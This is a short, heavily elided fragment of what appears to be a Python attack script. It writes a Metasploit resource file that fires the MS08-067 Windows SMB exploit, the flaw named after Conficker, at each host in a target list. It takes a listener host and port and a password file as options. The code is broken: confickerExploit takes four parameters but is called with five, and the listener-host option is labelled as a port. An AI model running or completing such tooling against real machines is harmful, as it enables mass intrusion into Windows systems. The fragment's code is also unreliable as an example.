...
def confickerExploit(configFile, tgtHost, lhost, lport):
	...
	configFile.write('use exploit/windows/smb/ms_08_067_netapi\n')
...
def main():
	...
	parse.add_option('-l', dest='lhost', type='string', \
		help='specify the listen port')
	parse.add_option('-F', dest='passwdFile', type='string', \
	...
	for tgtHost in tgtHosts:
		confickerExploit(configFile, tgtHost, passwdFile, lhost, lport)
		if passwdFile != None:
